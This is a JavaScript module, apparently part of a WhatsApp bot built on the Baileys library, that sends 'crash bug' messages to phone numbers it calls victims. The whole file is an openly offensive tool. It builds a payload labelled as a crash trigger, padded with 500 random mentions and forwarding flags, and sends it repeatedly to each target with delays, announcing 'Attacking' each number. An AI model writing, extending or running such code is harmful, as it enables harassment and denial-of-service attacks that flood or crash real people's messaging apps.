// File: keizzah/bugs/xeonRobust.js
const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");

class XeonRobust {
    constructor() {
        this.config = {
            MAX_BUGS: 50,
            DELAY_BETWEEN_BUGS: 2500,
            DELAY_BETWEEN_VICTIMS: 4000
        };
    }

    // Validate phone number format
    isValidPhone(phone) {
        return /^(\+\d{1,3})?\d{9,15}$/.test(phone);
    }

    // Generate a safe but effective bug payload
    generatePayload() {
        return {
            extendedTextMessage: {
                text: "XEON_CRASH_TRIGGER",
                contextInfo: {
                    mentionedJid: this.generateMentions(500),
                    forwardingScore: 999,
                    isForwarded: true,
                    participant: "0@s.whatsapp.net",
                    quotedMessage: {
                        conversation: "QUOTED_CRASH_PAYLOAD"
                    }
                }
            }
        };
    }

    // Generate random mentions
    generateMentions(count) {
        return Array.from({length: count}, () => 
            `1${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        );
    }

    // Send bugs to target
    async sendToTarget(zk, target, amount, options = {}) {
        const { ms, repondre } = options;
        const results = { success: 0, failed: 0 };

        for (let i = 0; i < amount; i++) {
            try {
                const payload = this.generatePayload();
                await zk.sendMessage(target, payload, { quoted: ms });
                results.success++;
                
                if (i < amount - 1) {
                    await new Promise(resolve => 
                        setTimeout(resolve, this.config.DELAY_BETWEEN_BUGS)
                    );
                }
            } catch (error) {
                console.error(`Error sending to ${target}:`, error);
                results.failed++;
                break; // Stop on first error
            }
        }

        return results;
    }

    // Main send function
    async send(dest, zk, commandOptions, victims, amount) {
        const { ms, repondre } = commandOptions;
        const results = [];

        for (const victim of victims) {
            if (!this.isValidPhone(victim)) {
                await repondre(`❌ Invalid number format: ${victim}`);
                results.push({ victim, status: 'invalid' });
                continue;
            }

            const target = victim.includes('@s.whatsapp.net') ? 
                victim : `${victim}@s.whatsapp.net`;

            await repondre(`⚡ Attacking ${target}...`);
            const result = await this.sendToTarget(zk, target, amount, { ms, repondre });

            results.push({
                victim: target,
                sent: result.success,
                failed: result.failed
            });

            if (victims.length > 1 && victim !== victims[victims.length - 1]) {
                await new Promise(resolve => 
                    setTimeout(resolve, this.config.DELAY_BETWEEN_VICTIMS)
                );
            }
        }

        return results;
    }
}

module.exports = new XeonRobust();
